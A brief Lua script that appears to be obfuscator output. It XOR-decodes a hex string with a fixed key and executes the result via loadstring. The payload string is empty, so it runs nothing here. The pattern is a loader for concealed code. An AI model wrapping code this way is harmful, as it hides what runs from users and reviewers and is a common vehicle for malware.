local k={78,255,41,11,84,221,125,132,235,82,188,72,159,133,116,222,212,238,2,114,31,125,133,244,241,133,21,49,232,226,9,61}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
